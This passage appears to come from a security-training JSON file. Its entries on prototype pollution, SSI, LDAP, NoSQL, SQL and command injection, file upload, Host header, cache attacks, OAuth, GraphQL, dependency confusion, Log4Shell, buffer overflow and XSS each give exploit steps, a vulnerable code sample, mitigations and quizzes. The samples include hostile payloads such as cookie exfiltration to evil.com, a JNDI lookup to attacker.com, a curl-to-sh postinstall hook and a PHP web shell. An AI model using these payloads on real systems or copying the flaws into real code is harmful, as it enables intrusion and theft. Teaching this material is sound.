      "code": "// Vulnerable recursive merge (simplified, lodash.merge-style)\nfunction merge(target, src) {\n  for (let key in src) {\n    if (typeof src[key] === 'object') merge(target[key] ??= {}, src[key]);\n    else target[key] = src[key];\n  }\n}\nmerge(config, JSON.parse(req.body)); // no key filtering\n\n// Attacker payload\n{ \"__proto__\": { \"isAdmin\": true } }"
    },
    "mitigation": "Freeze prototypes, use Map, sanitize __proto__/constructor.",
    "quizzes": [
      {
        "question": "Which key is central to prototype pollution?",
        "options": [
          "__proto__",
          "self",
          "this",
          "window"
        ],
        "answer": 0
      },
      {
        "question": "Why is prototype pollution especially dangerous in JavaScript apps?",
        "options": [
          "It can affect every object in the application that shares the polluted prototype, not just one record",
          "It only affects the database",
          "It requires admin access to exploit",
          "It only works in older browsers"
        ],
        "answer": 0
      },
      {
        "question": "Which defenses help prevent prototype pollution?",
        "options": [
          "Freezing Object.prototype, using Map instead of plain objects, and filtering dangerous keys like __proto__/constructor during merges",
          "Minifying the JavaScript bundle",
          "Adding more unit tests for the UI",
          "Switching to server-side rendering"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Server-Side Includes (SSI) Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "Inject SSI directives into server-parsed pages, leading to command execution.",
    "theory": "Servers parsing SSI (.shtml) execute directives like <!--#exec--> found in user input.",
    "cve": "CVE-2021-40438 context (Apache)",
    "exploit": "1. Inject <!--#exec cmd=\"id\"--> into a reflected field on an SSI page.\n2. Server executes the command and reflects output.",
    "example": {
      "scenario": "A guestbook page rendered as .shtml echoes back the visitor's name field directly into the page; an attacker submits an SSI exec directive as their 'name' and the server runs it as a shell command.",
      "code": "<!-- Vulnerable guestbook.shtml template -->\nWelcome, <!--#echo var=\"QUERY_STRING_name\" -->!\n\n// Attacker submits as name parameter:\nname=<!--#exec cmd=\"id\"-->\n// When the page is re-rendered, the server executes 'id' and reflects the output"
    },
    "mitigation": "Disable SSI exec, sanitize input, avoid .shtml for user content.",
    "quizzes": [
      {
        "question": "SSI injection executes directives like:",
        "options": [
          "<!--#exec cmd=...-->",
          "<script>",
          "SELECT *",
          "${jndi}"
        ],
        "answer": 0
      },
      {
        "question": "What server-side condition is required for SSI injection to be exploitable?",
        "options": [
          "The server must parse the page for SSI directives (typically .shtml) and reflect unsanitized user input into it",
          "The site must use cookies",
          "The site must run on Windows",
          "The site must use a CDN"
        ],
        "answer": 0
      },
      {
        "question": "What's a key mitigation for SSI injection?",
        "options": [
          "Disable the SSI #exec directive and avoid serving user-influenced content as SSI-parsed pages",
          "Use a stronger TLS cipher",
          "Add a WAF rule for SQL keywords only",
          "Increase server RAM"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "LDAP Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "Manipulate LDAP queries via unsanitized input to bypass auth or extract data.",
    "theory": "Apps building LDAP filters from input can be tricked with special chars (*, ), |, &) to alter logic.",
    "cve": "CVE-2018-1000134 context",
    "exploit": "1. In a login filter (uid={input}), enter *)(uid=*))(|(uid=*.\n2. Filter always matches -> auth bypass.",
    "example": {
      "scenario": "A corporate intranet login checks credentials against an LDAP directory by directly inserting the submitted username into the search filter, letting an attacker craft a filter that always evaluates true and logs in as anyone.",
      "code": "// Vulnerable LDAP filter construction\nconst filter = `(uid=${username})`; // string concatenation, no escaping\n\n// Attacker input for username field\n*)(uid=*))(|(uid=*\n// Resulting filter becomes effectively: (uid=*) -- matches every entry in the directory"
    },
    "mitigation": "Escape LDAP special chars, parameterized LDAP APIs.",
    "quizzes": [
      {
        "question": "Which character is heavily abused in LDAP injection?",
        "options": [
          "*",
          "@",
          "#",
          "~"
        ],
        "answer": 0
      },
      {
        "question": "What is the LDAP injection attacker primarily manipulating?",
        "options": [
          "The logic of the LDAP search filter built from unsanitized input",
          "The TLS handshake",
          "The DNS resolution order",
          "The HTTP response headers"
        ],
        "answer": 0
      },
      {
        "question": "What's the recommended fix for LDAP injection?",
        "options": [
          "Properly escape LDAP special characters or use parameterized/safe LDAP query APIs",
          "Disable LDAP entirely",
          "Use a longer password policy",
          "Switch to OAuth"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "NoSQL Injection",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Injection targeting NoSQL databases (MongoDB) via operator manipulation.",
    "theory": "NoSQL queries accept objects; passing operators like {$ne:null} can bypass auth or extract data.",
    "cve": "CVE-2021-22911 (Rocket.Chat)",
    "exploit": "1. Login JSON: {\"user\":\"admin\",\"pass\":{\"$ne\":null}}.\n2. Matches any non-null password -> login as admin.",
    "example": {
      "scenario": "A MongoDB-backed login endpoint passes the JSON body's password field directly into the query; sending a MongoDB operator object instead of a plain string string bypasses authentication entirely.",
      "code": "// Vulnerable login query\nconst user = await db.collection('users').findOne({\n  username: req.body.username,\n  password: req.body.password  // attacker sends an object, not a string\n});\n\n// Attacker request body\n{ \"username\": \"admin\", \"password\": { \"$ne\": null } }\n// Query becomes: password != null -> matches the admin account regardless of the real password"
    },
    "mitigation": "Cast inputs to expected types; reject objects where strings expected.",
    "quizzes": [
      {
        "question": "Which MongoDB operator is abused to bypass login?",
        "options": [
          "$ne",
          "$pull",
          "$inc",
          "$set"
        ],
        "answer": 0
      },
      {
        "question": "Why does sending a JSON object instead of a string break the login check in NoSQL injection?",
        "options": [
          "NoSQL queries can interpret operator objects (like $ne, $gt) as query logic instead of literal values",
          "The database crashes and grants access by default",
          "It triggers a buffer overflow",
          "It disables TLS"
        ],
        "answer": 0
      },
      {
        "question": "What is an effective defense against NoSQL injection?",
        "options": [
          "Strictly enforce expected data types (reject objects where a string is expected) before querying",
          "Use a longer collection name",
          "Disable indexing",
          "Increase query timeout"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Unrestricted File Upload",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "Upload of dangerous file types (.php) that can be executed, leading to RCE.",
    "theory": "When validation relies on extension or client checks, attackers upload web shells. Bypasses: double extensions, null bytes, content-type spoofing.",
    "cve": "CVE-2020-9484 (Apache Tomcat)",
    "exploit": "1. Upload shell.php.jpg or shell.php%00.jpg.\n2. Access the uploaded path.\n3. Execute commands via the web shell.",
    "example": {
      "scenario": "A profile-picture upload feature only checks the file's declared Content-Type (which the client can freely fake) and stores the file inside the public web root, letting an attacker upload a PHP web shell disguised as an image.",
      "code": "// Vulnerable upload handler — trusts client-supplied content-type, stores in webroot\nif (req.file.mimetype.startsWith('image/')) {\n  fs.writeFileSync(`./public/uploads/${req.file.originalname}`, req.file.buffer);\n}\n\n// Attacker uploads shell.php.jpg with a spoofed Content-Type: image/jpeg header\n// File content: <?php system($_GET['cmd']); ?>\n// Then accesses: GET /uploads/shell.php.jpg?cmd=id  (server still parses .php extension)"
    },
    "mitigation": "Server-side type validation, store outside webroot, rename, disable execution.",
    "quizzes": [
      {
        "question": "A safe practice for uploads is to store files where?",
        "options": [
          "Inside the web root",
          "Outside the web root / non-executable dir",
          "In /etc",
          "In cookies"
        ],
        "answer": 1
      },
      {
        "question": "Why is client-supplied Content-Type alone insufficient to validate an upload?",
        "options": [
          "The attacker fully controls that header and can set it to anything regardless of actual file content",
          "Content-Type is encrypted",
          "Browsers strip Content-Type automatically",
          "Servers ignore Content-Type entirely"
        ],
        "answer": 0
      },
      {
        "question": "Which bypass technique tricks naive extension-based filters into accepting an executable file?",
        "options": [
          "Double extensions or null-byte tricks like shell.php.jpg or shell.php%00.jpg",
          "Using a longer filename",
          "Uploading via FTP instead of HTTP",
          "Compressing the file first"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Host Header Injection",
    "category": "Server-Side",
    "severity": "Medium",
    "definition": "Manipulate the Host header to poison links, reset passwords, or cache.",
    "theory": "Apps trusting Host to build URLs (password resets) can generate links to attacker domains, leaking tokens.",
    "cve": "CVE-2018-14773 context (Symfony)",
    "exploit": "1. Request password reset with Host: evil.com.\n2. Reset link points to evil.com with victim's token.\n3. Victim clicks -> token leaked.",
    "example": {
      "scenario": "A password-reset email builder trusts the incoming Host header to construct the reset link; an attacker requests a reset for the victim's email while sending a forged Host header, so the victim receives a real reset email pointing to the attacker's domain — leaking the reset token the moment they click it.",
      "code": "// Vulnerable link-building code\nconst resetLink = `http://${req.headers.host}/reset?token=${token}`;\n// emailed to the victim as: Click here to reset your password: <resetLink>\n\n// Attacker's forged request\nPOST /forgot-password HTTP/1.1\nHost: evil.com\nContent-Type: application/json\n\n{\"email\":\"victim@company.com\"}\n// Victim receives a legitimate-looking email, but the link points to evil.com/reset?token=..."
    },
    "mitigation": "Allowlist valid hosts; don't build absolute URLs from Host.",
    "quizzes": [
      {
        "question": "Host header injection is often chained with which feature?",
        "options": [
          "Password reset links",
          "CSS rendering",
          "Image resizing",
          "Logging"
        ],
        "answer": 0
      },
      {
        "question": "Why is trusting the Host header risky?",
        "options": [
          "The Host header is fully attacker-controlled in the raw HTTP request and not guaranteed to match the real domain",
          "The Host header is encrypted by default",
          "The Host header is validated by browsers automatically",
          "The Host header only exists in HTTP/2"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct fix for Host header injection?",
        "options": [
          "Use a server-side allowlist of valid hostnames instead of building absolute URLs from the incoming Host header",
          "Encrypt the Host header",
          "Increase the token length",
          "Use a CDN"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cache Poisoning",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "Inject malicious content into a cache so it's served to other users.",
    "theory": "Unkeyed inputs (headers) that influence responses but aren't part of the cache key let an attacker poison cached responses.",
    "cve": "Various CDN cases",
    "exploit": "1. Find unkeyed header (X-Forwarded-Host) reflected in response.\n2. Send poisoned request; CDN caches it.\n3. Other users receive malicious cached page.",
    "example": {
      "scenario": "A site reflects the X-Forwarded-Host header into a canonical link tag, but the CDN's cache key only includes the URL path, not that header — so an attacker's single poisoned request gets cached and served to every subsequent visitor of that page.",
      "code": "<!-- Vulnerable page reflects an unkeyed header -->\n<link rel=\"canonical\" href=\"https://<X-Forwarded-Host value>/page\">\n\n// Attacker request (cache key = just /page, header is NOT part of the key)\nGET /page HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: evil.com\n\n// CDN caches this poisoned response under /page\n// Every other visitor to /page now gets the canonical link pointing to evil.com"
    },
    "mitigation": "Include all influencing inputs in cache key; sanitize reflected headers.",
    "quizzes": [
      {
        "question": "Cache poisoning exploits which type of input?",
        "options": [
          "Unkeyed inputs",
          "Encrypted inputs",
          "Compressed inputs",
          "Signed inputs"
        ],
        "answer": 0
      },
      {
        "question": "Why is an 'unkeyed' input dangerous for caching?",
        "options": [
          "It can influence the response content without being part of the cache key, so a malicious version gets cached and served to other users",
          "It bypasses TLS",
          "It always returns a 500 error",
          "It only affects the attacker's own browser"
        ],
        "answer": 0
      },
      {
        "question": "What's an effective mitigation for web cache poisoning?",
        "options": [
          "Ensure every input that influences the response is included in the cache key, or strip/sanitize unkeyed inputs before they affect output",
          "Disable caching site-wide permanently",
          "Use a shorter cache TTL only",
          "Add a CAPTCHA"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "OAuth Misconfiguration",
    "category": "Auth & Session",
    "severity": "Critical",
    "definition": "Flaws in OAuth flows such as weak redirect_uri validation enabling token theft.",
    "theory": "Loose redirect_uri matching, missing state (CSRF), or leaking codes allow account takeover via the OAuth flow.",
    "cve": "CVE-2020-26877 context",
    "exploit": "1. Manipulate redirect_uri to attacker domain (if not strict).\n2. Victim's code/token delivered to attacker.\n3. Exchange for access -> account takeover.",
    "example": {
      "scenario": "A 'Login with Google' integration validates redirect_uri with a loose prefix match instead of an exact match, letting an attacker register a lookalike redirect URL that captures the victim's authorization code and takes over their account.",
      "code": "// Vulnerable redirect_uri validation (substring/prefix match instead of exact)\nif (redirect_uri.startsWith('https://app.com')) { /* allowed */ }\n\n// Attacker-crafted authorization request\nhttps://oauth-provider.com/authorize?\n  client_id=app123&\n  redirect_uri=https://app.com.evil.com/callback&  // passes the loose 'startsWith' check\n  response_type=code&state=xyz\n// Victim's authorization code gets delivered to the attacker's domain"
    },
    "mitigation": "Exact-match redirect_uri, enforce state, short-lived codes, PKCE.",
    "quizzes": [
      {
        "question": "Which parameter prevents CSRF in OAuth flows?",
        "options": [
          "scope",
          "state",
          "client_id",
          "grant_type"
        ],
        "answer": 1
      },
      {
        "question": "Why is exact-match validation of redirect_uri critical?",
        "options": [
          "Loose matching (prefix/substring) lets an attacker register a similar-looking domain that still passes validation, stealing the auth code/token",
          "Exact match makes the login page load faster",
          "It prevents password reuse",
          "It encrypts the access token"
        ],
        "answer": 0
      },
      {
        "question": "What does PKCE (Proof Key for Code Exchange) protect against in OAuth?",
        "options": [
          "Authorization code interception/replay by a party that doesn't possess the original code verifier",
          "SQL injection",
          "DNS spoofing",
          "Buffer overflows"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "GraphQL Vulnerabilities",
    "category": "API Security",
    "severity": "Medium",
    "definition": "Introspection abuse, batching attacks, excessive data exposure in GraphQL APIs.",
    "theory": "GraphQL flexibility leaks schema via introspection, allows DoS via nested queries, brute-force via batching/aliasing.",
    "cve": "CVE-2021-41248 context",
    "exploit": "1. Run introspection query to map the schema.\n2. Use aliases to batch many login attempts in one request.\n3. Nested queries for resource exhaustion (DoS).",
    "example": {
      "scenario": "A GraphQL API leaves introspection enabled in production, letting an attacker map every field and mutation in the schema, then uses query aliasing to bundle hundreds of login-guess attempts into a single HTTP request — bypassing simple per-request rate limits.",
      "code": "# Step 1: introspection reveals the full schema\nquery { __schema { types { name fields { name } } } }\n\n# Step 2: aliased batch login-brute-force in ONE request\nquery {\n  a1: login(user:\"admin\", pass:\"123456\") { token }\n  a2: login(user:\"admin\", pass:\"password\") { token }\n  a3: login(user:\"admin\", pass:\"admin123\") { token }\n  # ...hundreds more aliases in the same request\n}"
    },
    "mitigation": "Disable introspection in prod, depth/complexity limits, rate-limit.",
    "quizzes": [
      {
        "question": "Which GraphQL feature leaks the entire API schema?",
        "options": [
          "Mutations",
          "Introspection",
          "Subscriptions",
          "Fragments"
        ],
        "answer": 1
      },
      {
        "question": "How does GraphQL aliasing enable brute-force attacks that bypass naive rate limiting?",
        "options": [
          "Many distinct operations (e.g. login attempts) can be bundled into a single HTTP request using aliases, counting as just one request to a per-request limiter",
          "Aliasing encrypts the payload",
          "Aliasing disables authentication",
          "Aliasing only works over GET requests"
        ],
        "answer": 0
      },
      {
        "question": "What's a recommended hardening step for production GraphQL APIs?",
        "options": [
          "Disable introspection, and enforce query depth/complexity limits plus rate limiting on operation count, not just requests",
          "Allow unlimited nested queries for flexibility",
          "Expose the schema publicly for documentation purposes",
          "Use GET requests only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Web Cache Deception",
    "category": "Infrastructure",
    "severity": "Medium",
    "definition": "Trick a cache into storing sensitive personalized pages later read by attackers.",
    "theory": "Appending a fake static extension (/account/page.css) makes the cache store a victim's authenticated page as static.",
    "cve": "PayPal research (2017)",
    "exploit": "1. Lure victim to /profile/foo.css.\n2. Cache stores their personal response as static.\n3. Attacker requests same URL and reads data.",
    "example": {
      "scenario": "An attacker tricks a logged-in victim into visiting /account/profile/nonexistent.css — the app ignores the fake extension and serves the victim's real personal profile page, but the CDN sees '.css' and caches it as static content the attacker can then request and read.",
      "code": "// Attacker sends victim a link (e.g. via chat/email)\nhttps://victim-app.com/account/profile/anything.css\n\n// App backend ignores the path suffix and returns the victim's authenticated profile HTML\n// CDN sees the .css extension and caches the response as if it were a static stylesheet\n\n// Attacker later requests the exact same URL and receives the victim's cached personal data\nGET /account/profile/anything.css"
    },
    "mitigation": "Cache only verified static content; validate Content-Type.",
    "quizzes": [
      {
        "question": "Web cache deception abuses fake what?",
        "options": [
          "Static file extensions",
          "TCP ports",
          "DNS records",
          "JWT claims"
        ],
        "answer": 0
      },
      {
        "question": "What's the core mismatch that enables web cache deception?",
        "options": [
          "The application ignores the fake static extension and serves dynamic personal content, but the cache treats the URL as cacheable static content",
          "The browser caches passwords",
          "The server forgets to set cookies",
          "The CDN doesn't support HTTPS"
        ],
        "answer": 0
      },
      {
        "question": "How should caches defend against web cache deception?",
        "options": [
          "Validate the actual Content-Type of the response (not just the URL extension) before caching, and never cache authenticated/personalized pages",
          "Cache everything by default for performance",
          "Increase cache TTL",
          "Use a longer URL"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Broken Object Level Authorization (BOLA)",
    "category": "API Security",
    "severity": "Critical",
    "definition": "API endpoints expose objects by ID without checking ownership.",
    "theory": "OWASP API #1. Endpoints like /api/orders/{id} that don't verify ownership allow horizontal data access.",
    "cve": "CVE-2021-22214 context (GitLab API)",
    "exploit": "1. Request /api/v1/users/1001/invoice.\n2. Increment to 1002, 1003...\n3. Access other users' invoices.",
    "example": {
      "scenario": "An invoicing API returns any invoice by numeric ID without checking whether the requesting user actually owns it, letting a logged-in customer simply increment the ID in the URL to read every other customer's invoices.",
      "code": "// Vulnerable endpoint — fetches by ID with no ownership check\napp.get('/api/v1/users/:userId/invoice', requireAuth, async (req, res) => {\n  const invoice = await db.query('SELECT * FROM invoices WHERE user_id=$1', [req.params.userId]);\n  res.json(invoice); // never checks req.user.id === req.params.userId\n});\n\n// Attacker simply changes the ID in the URL\nGET /api/v1/users/1002/invoice  (while authenticated as user 1001)"
    },
    "mitigation": "Per-object authorization checks on every request; unguessable IDs.",
    "quizzes": [
      {
        "question": "BOLA is ranked #1 in which list?",
        "options": [
          "OWASP API Top 10",
          "CWE Top 5",
          "NIST 800-53",
          "PCI DSS"
        ],
        "answer": 0
      },
      {
        "question": "What's the precise flaw in BOLA, as opposed to just having predictable IDs?",
        "options": [
          "The server fails to verify that the authenticated user actually owns/is authorized to access the requested object",
          "The IDs are encrypted",
          "The API uses HTTP instead of HTTPS",
          "The session token is too short"
        ],
        "answer": 0
      },
      {
        "question": "What is the correct defense against BOLA?",
        "options": [
          "Enforce an object-level ownership/authorization check on every request that accesses an object by ID",
          "Make IDs longer strings",
          "Rate-limit the endpoint",
          "Add pagination"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Dependency Confusion",
    "category": "Supply Chain",
    "severity": "Critical",
    "definition": "Supply-chain attack where a public malicious package shadows a private internal package name.",
    "theory": "If a build pulls from public registries and a private name isn't claimed, an attacker publishes a higher-version public package that gets installed.",
    "cve": "Disclosed by Alex Birsan (2021)",
    "exploit": "1. Discover internal package names (leaked package.json).\n2. Publish same-named package on npm/PyPI with higher version.\n3. Victim's build installs yours -> code execution in CI.",
    "example": {
      "scenario": "A company's internal-only npm package 'acme-internal-auth' leaks in a public package.json on GitHub; an attacker publishes a public npm package with the exact same name and a higher version number, which the company's CI build then installs instead of the real internal package — running attacker code inside the build pipeline.",
      "code": "// Leaked internal package.json reveals a private dependency name\n\"dependencies\": { \"acme-internal-auth\": \"1.2.0\" }\n\n// Attacker publishes a public npm package with the same name, higher version\n// npm publish acme-internal-auth@9.9.9  (malicious postinstall script included)\n\n// CI pipeline, configured to check public npm first, installs the attacker's package\n// package.json \"postinstall\": \"curl https://evil.com/x.sh | sh\""
    },
    "mitigation": "Scoped packages, registry priorities, lock versions, claim namespaces.",
    "quizzes": [
      {
        "question": "Dependency confusion is a type of what attack?",
        "options": [
          "Supply chain attack",
          "DoS",
          "MITM",
          "Phishing"
        ],
        "answer": 0
      },
      {
        "question": "Why does the attacker publish a higher version number for the malicious package?",
        "options": [
          "Most package managers default to installing the highest available version across configured registries",
          "Higher version numbers bypass code review",
          "It makes the package load faster",
          "It avoids antivirus detection"
        ],
        "answer": 0
      },
      {
        "question": "What's a recommended defense against dependency confusion?",
        "options": [
          "Use scoped package names, explicit registry priorities/pinning, and claim internal package names on public registries",
          "Disable package-lock files",
          "Always install the latest version automatically",
          "Remove package.json from version control"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Log4Shell / EL Injection",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Injection into logging/EL frameworks (Log4j JNDI) enabling remote code execution.",
    "theory": "Log4j evaluated ${jndi:ldap://...} lookups in logged strings, fetching/executing remote classes. EL injection abuses Expression Language similarly.",
    "cve": "CVE-2021-44228 (Log4Shell)",
    "exploit": "1. Send a header/field with ${jndi:ldap://attacker.com/a}.\n2. Vulnerable Log4j logs it and connects to attacker LDAP.\n3. Malicious class loaded -> RCE.",
    "example": {
      "scenario": "A Java web server logs every incoming User-Agent header using a vulnerable Log4j version; an attacker sets their User-Agent to a JNDI lookup string, causing the server to silently connect to an attacker-controlled LDAP server and load a malicious Java class — full remote code execution from a single HTTP header.",
      "code": "// Vulnerable logging call\nlogger.info(\"Request from User-Agent: \" + request.getHeader(\"User-Agent\"));\n\n// Attacker-controlled header\nUser-Agent: ${jndi:ldap://attacker.com:1389/Exploit}\n\n// Log4j evaluates the lookup while logging, connects to attacker's LDAP server,\n// downloads and deserializes a malicious Java class -> arbitrary code execution"
    },
    "mitigation": "Patch Log4j (>=2.17), disable JNDI lookups, WAF, remove JndiLookup.",
    "quizzes": [
      {
        "question": "Which payload indicates a Log4Shell attempt?",
        "options": [
          "${jndi:ldap://...}",
          "' OR 1=1",
          "<img onerror>",
          "../../"
        ],
        "answer": 0
      },
      {
        "question": "Why was Log4Shell so widely impactful?",
        "options": [
          "Log4j is used in countless Java applications and the flaw could be triggered just by logging an attacker-controlled string, often via common headers",
          "It only affected one specific website",
          "It required physical server access",
          "It only worked on outdated browsers"
        ],
        "answer": 0
      },
      {
        "question": "What's the primary remediation for Log4Shell?",
        "options": [
          "Upgrade Log4j to a patched version (>=2.17) and/or disable JNDI lookups",
          "Block all logging entirely",
          "Switch programming languages",
          "Add a CAPTCHA to all forms"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Memory Corruption: Buffer Overflow",
    "category": "Memory Safety",
    "severity": "Critical",
    "definition": "Writing beyond a buffer's bounds, overwriting adjacent memory and potentially hijacking execution.",
    "theory": "In unsafe languages (C/C++), unchecked input copied into a fixed buffer overwrites the return address. Attackers redirect execution to shellcode or ROP chains.",
    "cve": "CVE-2019-0708 (BlueKeep)",
    "exploit": "1. Identify vulnerable input (strcpy, no bounds).\n2. Send oversized input to overwrite EIP/RIP.\n3. Control flow -> jump to shellcode (ROP to bypass DEP/ASLR).",
    "example": {
      "scenario": "A C network service copies an incoming username field into a fixed 64-byte stack buffer using strcpy with no length check; sending a username far longer than 64 bytes overflows the buffer and overwrites the function's return address, letting the attacker redirect execution to their own shellcode.",
      "code": "// Vulnerable C code\nvoid handle_login(char *input) {\n    char username[64];\n    strcpy(username, input); // no bounds check — classic overflow\n}\n\n// Attacker sends a 200-byte username:\n// [64 bytes of filler][8 bytes overwriting saved RBP][8 bytes overwriting return address -> shellcode address]\nhandle_login(\"AAAAAAAA...[200 bytes total, crafted to redirect RIP]\");"
    },
    "mitigation": "Safe functions, bounds checking, stack canaries, ASLR, DEP, memory-safe languages.",
    "quizzes": [
      {
        "question": "Buffer overflows typically aim to overwrite which value?",
        "options": [
          "The return address (EIP/RIP)",
          "The cookie",
          "The DNS cache",
          "The CSS"
        ],
        "answer": 0
      },
      {
        "question": "Which C function is a classic source of buffer overflow bugs because it performs no bounds checking?",
        "options": [
          "strcpy",
          "snprintf",
          "strlcpy",
          "memset"
        ],
        "answer": 0
      },
      {
        "question": "Which combination of modern mitigations makes classic stack buffer overflow exploitation much harder?",
        "options": [
          "Stack canaries, ASLR, and DEP/NX together",
          "Longer variable names",
          "Faster CPUs",
          "More RAM"
        ],
        "answer": 0
      },
      {
        "question": "What is the most fundamental long-term fix for buffer overflow vulnerabilities?",
        "options": [
          "Using memory-safe languages or bounds-checked operations instead of unchecked fixed-size buffer copies",
          "Increasing buffer size arbitrarily",
          "Disabling logging",
          "Using shorter passwords"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "SQL Injection",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Untrusted input is concatenated into a SQL query, letting an attacker alter the query's logic to read, modify, or delete database data.",
    "theory": "When user input is inserted directly into a SQL string instead of being passed as a parameter, attackers can break out of the intended data context and inject their own SQL keywords/operators, bypassing authentication or extracting entire tables.",
    "cve": "CVE-2019-3396 (Atlassian Confluence)",
    "exploit": "1. Find a param reflected in a query (?id=5).\n2. Test with id=5' OR '1'='1.\n3. If behavior changes, use UNION SELECT to extract data from other tables.\n4. Use sqlmap to automate extraction.",
    "example": {
      "scenario": "A product search page builds its SQL query by directly concatenating the search term, letting an attacker bypass the query entirely and dump the entire users table including password hashes.",
      "code": "// Vulnerable Node.js code\nconst query = `SELECT * FROM products WHERE name = '${req.query.q}'`;\ndb.query(query);\n\n// Attacker input\n?q=' UNION SELECT username, password_hash FROM users--"
    },
    "mitigation": "Use parameterized queries / prepared statements; never concatenate input into SQL; least-privilege DB accounts.",
    "quizzes": [
      {
        "question": "What is the most effective defense against SQL injection?",
        "options": [
          "Parameterized queries / prepared statements",
          "Minifying JavaScript",
          "Using HTTPS",
          "Adding a CAPTCHA"
        ],
        "answer": 0
      },
      {
        "question": "Which classic payload is used to test for SQL injection in a login form?",
        "options": [
          "' OR '1'='1",
          "{{7*7}}",
          "../../etc/passwd",
          "<script>alert(1)</script>"
        ],
        "answer": 0
      },
      {
        "question": "What SQL clause is commonly used to extract data from other tables once injection is confirmed?",
        "options": [
          "UNION SELECT",
          "GROUP BY",
          "ORDER BY",
          "LIMIT"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Command Injection (OS Command Injection)",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Untrusted input is passed to a system shell, letting an attacker execute arbitrary operating system commands.",
    "theory": "Apps that build shell commands from user input (e.g. calling ping, convert, or grep with a filename) allow attackers to append shell metacharacters (;, |, &&) to chain additional commands.",
    "cve": "CVE-2021-22205 (GitLab ExifTool)",
    "exploit": "1. Find a feature that shells out (e.g. ping a host, convert a file).\n2. Append a metacharacter: 127.0.0.1; whoami.\n3. Server executes both commands and may reflect output.",
    "example": {
      "scenario": "A network diagnostics tool lets users 'ping' a hostname, but passes the input straight into a shell command, letting an attacker chain on an arbitrary command after a semicolon.",
      "code": "// Vulnerable Node.js code\nconst { exec } = require('child_process');\nexec(`ping -c 4 ${req.query.host}`, (err, stdout) => res.send(stdout));\n\n// Attacker input\n?host=127.0.0.1; cat /etc/passwd"
    },
    "mitigation": "Avoid shelling out with user input; use safe APIs (execFile with an argument array), strict allowlisting.",
    "quizzes": [
      {
        "question": "Which shell metacharacter is commonly used to chain a second command in command injection?",
        "options": [
          ";",
          "%",
          "#",
          "@"
        ],
        "answer": 0
      },
      {
        "question": "What's the safest way to call an external command with user-supplied arguments?",
        "options": [
          "Use an API that takes arguments as an array (e.g. execFile) instead of building a shell string",
          "Always run commands as root",
          "Use a longer timeout",
          "Encode the input in base64"
        ],
        "answer": 0
      },
      {
        "question": "Why is command injection often rated more severe than many injection types?",
        "options": [
          "It can grant direct control of the underlying operating system, not just the application data layer",
          "It only affects logging",
          "It cannot be automated",
          "It requires physical access"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Reflected Cross-Site Scripting (XSS)",
    "category": "Injection",
    "severity": "High",
    "definition": "User input is echoed back into a page's HTML/JS without sanitization, executing attacker-controlled script in the victim's browser.",
    "theory": "Reflected XSS occurs when input from the current request (URL param, form field) is immediately reflected into the response without encoding, so a crafted link executes script the moment the victim clicks it.",
    "cve": "CVE-2020-11022 (jQuery)",
    "exploit": "1. Find a param reflected in the page (?name=Het).\n2. Test ?name=<script>alert(1)</script>.\n3. If it executes, craft a link that steals cookies: <script>fetch('//evil.com?c='+document.cookie)</script>.",
    "example": {
      "scenario": "A search results page echoes back 'No results for: <query>' without escaping it, so a phishing link containing a script tag as the query steals the victim's session cookie the moment they click it.",
      "code": "// Vulnerable server code\nres.send(`<p>No results for: ${req.query.q}</p>`); // unescaped\n\n// Phishing link sent to victim\nhttps://shop.com/search?q=<script>fetch('//evil.com/steal?c='+document.cookie)</script>"
    },
    "mitigation": "Context-aware output encoding, Content-Security-Policy, HttpOnly cookies.",
    "quizzes": [
      {
        "question": "Reflected XSS executes script from which source?",
        "options": [
          "The current request's input, immediately reflected back",
          "Data stored permanently in the database",
          "A separate malicious server",
          "The browser's cache"
        ],
        "answer": 0
      },
      {
        "question": "What is the primary defense against reflected XSS?",
        "options": [
          "Context-aware output encoding of all user input before rendering",
          "Using a faster server",
          "Disabling cookies entirely",
          "Adding rate limiting"
        ],
        "answer": 0
      },
      {
        "question": "Which cookie attribute limits the damage of XSS by preventing JavaScript from reading the cookie?",
        "options": [
          "HttpOnly",
          "Secure",
          "Path",
          "Domain"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Stored Cross-Site Scripting (XSS)",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Malicious script is saved on the server (e.g. in a comment or profile field) and executes for every user who later views that content.",
    "theory": "Unlike reflected XSS, stored XSS persists in the database. Any visitor viewing the infected page — not just the one who submitted it — runs the attacker's script, making it far more impactful (e.g. mass account takeover via an admin panel).",
    "cve": "CVE-2022-29464 (WSO2)",
    "exploit": "1. Submit a comment containing <script>...</script>.\n2. If stored and rendered unescaped, every visitor who views that page executes it.\n3. Target an admin-viewed page (support tickets, user reports) to escalate to admin account takeover.",
    "example": {
      "scenario": "An attacker posts a product review containing a script tag; the review is stored as-is and rendered on the public product page, so every visitor — including store admins reviewing flagged comments — has their session cookie silently exfiltrated.",
      "code": "// Attacker-submitted review (stored verbatim in DB)\n{ \"review\": \"Great product! <script>fetch('//evil.com/c?d='+document.cookie)</script>\" }\n\n// Vulnerable rendering on the product page\n<div class=\"review\">${review.text}</div>  <!-- rendered without escaping -->"
    },
    "mitigation": "Escape output on render (not just on input), sanitize HTML with an allowlist library, CSP.",
    "quizzes": [
      {
